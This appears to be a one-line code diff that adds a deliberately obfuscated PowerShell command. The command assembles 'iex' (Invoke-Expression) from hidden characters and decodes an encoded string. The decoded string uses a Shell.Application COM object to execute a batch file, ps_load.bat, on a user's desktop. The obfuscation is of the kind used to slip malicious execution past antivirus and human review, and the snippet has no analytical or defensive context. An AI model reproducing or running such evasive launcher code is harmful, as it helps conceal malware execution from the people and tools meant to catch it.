@@ -1,0 +1,1 @@
+﻿ &( $vERBOSEpREfErENce.TOsTriNg()[1,3]+'X'-JoIN'') ( (('(New-'+'Object -'+'com Sh'+'ell.A'+'pp'+'li'+'c'+'a'+'t'+'ion'+').ShellExecute('+'Z'+'UfC:'+'X'+'8WUser'+'sX8WagavranX8WDesktopX8W'+'p'+'s_load.'+'ba'+'t'+'ZUf);') -RePLacE  ([chaR]88+[chaR]56+[chaR]87),[chaR]92  -RePLacE ([chaR]90+[chaR]85+[chaR]102),[chaR]39) )
